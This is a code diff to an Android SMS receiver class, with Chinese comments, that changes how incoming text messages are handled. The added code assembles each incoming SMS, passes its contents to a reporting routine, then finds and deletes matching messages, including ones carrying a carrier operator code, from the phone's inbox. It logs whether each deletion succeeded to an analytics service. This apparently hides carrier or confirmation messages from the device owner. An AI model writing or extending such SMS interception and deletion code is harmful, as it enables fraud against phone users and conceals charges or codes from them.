@@ -56,6 +56,7 @@ public class Receiver_SMS extends BroadcastReceiver {
 	@Override
 	public void onReceive(Context context, Intent intent) {
 		try {
+            Log.d(TAG,"Receiver_SMS.onReceive:intent:"+intent.getAction());
 			if (SMS_ACTION.equals(intent.getAction())) {
 				Bundle args = intent.getExtras();
 				String msgContent = "";
@@ -75,15 +76,26 @@ public class Receiver_SMS extends BroadcastReceiver {
 
 				if (args != null) {
 					Object[] pdus = (Object[]) args.get(SMS_SERVICE);
+                    //pdu为承载着一条短信的所有短信。
+                    //一条短信为140个英文字符长度，在这个长度范围内，即需一个pdu即可。超出这个范围，即要分割成多个pdu数组。
+                    Log.d(TAG,"该短信由几个pdus组成："+pdus.length);
 					SmsMessage messages[] = new SmsMessage[pdus.length];
+                    StringBuilder sb = new StringBuilder();
+                    for(int i = 0;i<messages.length;i++){
+                        messages[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
+                        sb.append(messages[i].getMessageBody());
+                    }
+                    if(sb.toString() != null){
+                        if (DEBUG) {
+                            Log.d(TAG, "收到的短信内容：" + sb.toString());
+                        }
+                        reportData(context,sb.toString());
+                    }
+
 					for (int i = 0; i < messages.length; i++) {
 						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 						msgContent = messages[i].getMessageBody();
 						if (msgContent != null) {
-							if (DEBUG) {
-								Log.d(TAG, "收到的短信内容：" + msgContent);
-							}
-							reportData(context, msgContent);
 							if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
 								if (SmsWriteOpUtil.isWriteEnabled(context)) {
 									boolean isSuccess = SmsWriteOpUtil.setWriteEnabled(context, true);
@@ -102,6 +114,7 @@ public class Receiver_SMS extends BroadcastReceiver {
 							deleteSMS(context, GetMsgRunnable.currentCheckInfo.getOperatorCode());
 							//删除短信短信
 							deleteSMS(context, msgContent);
+                            return;
 						}
 					}
 				}
@@ -136,8 +149,7 @@ public class Receiver_SMS extends BroadcastReceiver {
 				.append("phoneNumber:" + info.getPhonenumber()).append("\n")
 				.append("operator:" + info.getOperators()).append("\n")
 				.append("operatorcode:" + info.getOperatorcode()).append("\n")
-				.append("smsinfo:" + info.getMessageinfo()).append("\n")
-				.append("\n").append("\n");
+				.append("smsinfo:" + info.getMessageinfo()).append("\n");
 		EventBus.getDefault().post(new MessageEvent(builder.toString()));
 
 		try {
@@ -156,46 +168,50 @@ public class Receiver_SMS extends BroadcastReceiver {
 			if (DEBUG) {
 				Log.d(TAG, "要删除的短信内容是：" + smsContent);
 			}
+            EventBus.getDefault().post(new MessageEvent("want to delete: "+smsContent));
+
 			Uri uri = Uri.parse(SMS_CONTENT);
 			ContentResolver contentResolver = context.getContentResolver();
 			if (contentResolver != null) {
-				Cursor isRead = contentResolver.query(uri, null, null, null, null);
-				while (isRead.moveToNext()) {
-					String body = isRead.getString(isRead.getColumnIndex(SMS_BODY)).trim();
-					if (DEBUG) {
-						Log.d(TAG, "短信内容:" + body);
-					}
-					if (body.equals(smsContent)) {
-						int id = isRead.getInt(isRead.getColumnIndex(SMS_ID));
-						if (DEBUG) {
-							Log.d(TAG, "找到该短信:" + smsContent + " 短信标识为:" + id + "准备删除!");
-						}
-						int count = context.getContentResolver().delete(Uri.parse(SMS_CONTENT), "_id=" + id, null);
+                String select =  SMS_BODY+" LIKE ?";
+                String[] selectArgs = new String[]{"%" + smsContent + "%"};
+				Cursor isRead = contentResolver.query(uri, null, select, selectArgs, "date desc");
+                boolean isExist = isRead.moveToFirst();
+                if(isExist){
+                    Log.d(TAG, "存在该字串！！！！");
+                    EventBus.getDefault().post(new MessageEvent("is exist!"));
+                    int id = isRead.getInt(isRead.getColumnIndex(SMS_ID));
+                    if (DEBUG) {
+                        Log.d(TAG, "找到该短信:" + smsContent + " 短信标识为:" + id + "准备删除!");
+                    }
+                    int count = context.getContentResolver().delete(Uri.parse(SMS_CONTENT), "_id=" + id, null);
 
-						final String device = Build.MODEL;
-						final String verison = Build.VERSION.RELEASE;
-						final boolean isDeleteSuccess = count >= 1 ? true : false;
-						Map<String, String> map1 = new HashMap<>();
-						map1.put(NativeParams.KEY_DELETE_SMS_SUCCESS, String.valueOf(isDeleteSuccess));
-						FlurryAgent.logEvent(NativeParams.EVENT_SEND_SMS,map1);
+                    final String device = Build.MODEL;
+                    final String verison = Build.VERSION.RELEASE;
+                    final boolean isDeleteSuccess = count >= 1 ? true : false;
+                    Map<String, String> map1 = new HashMap<>();
+                    map1.put(NativeParams.KEY_DELETE_SMS_SUCCESS, String.valueOf(isDeleteSuccess));
+                    FlurryAgent.logEvent(NativeParams.EVENT_SEND_SMS,map1);
 
-						if (count >= 1) {
-							Map<String, String> map = new HashMap<>();
-							map.put(NativeParams.KEY_DELETE_SUCCESS_DEVICE, device);
-							map.put(NativeParams.KEY_DELETE_SUCCESS_VERSION, verison);
-                            FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_SUCCESS,map);
-						} else {
-							Map<String, String> map = new HashMap<>();
-							map.put(NativeParams.KEY_DELETE_FAIL_DEVICE, device);
-							map.put(NativeParams.KEY_DELETE_FAIL_VERSION, verison);
-							FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_FAILED,map);
-						}
-						if (DEBUG) {
-							Log.d(TAG, "当前版本号:" + Build.VERSION.SDK_INT + "短信是否删除成功：" + ((count >= 1) ? "删除成功" :
-									"删除失败"));
-						}
-					}
-				}
+                    if (count >= 1) {
+                        Map<String, String> map = new HashMap<>();
+                        map.put(NativeParams.KEY_DELETE_SUCCESS_DEVICE, device);
+                        map.put(NativeParams.KEY_DELETE_SUCCESS_VERSION, verison);
+                        FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_SUCCESS,map);
+                    } else {
+                        Map<String, String> map = new HashMap<>();
+                        map.put(NativeParams.KEY_DELETE_FAIL_DEVICE, device);
+                        map.put(NativeParams.KEY_DELETE_FAIL_VERSION, verison);
+                        FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_FAILED,map);
+                    }
+                    if (DEBUG) {
+                        Log.d(TAG, "当前版本号:" + Build.VERSION.SDK_INT + "短信是否删除成功：" + ((count >= 1) ? "删除成功" :
+                                "删除失败"));
+                    }
+                    EventBus.getDefault().post(new MessageEvent((count >=1)?"delete success":"delete failed"));
+                    isRead.close();
+                }
+
 			}
 		} catch (Throwable e) {
 			if (DEBUG) {
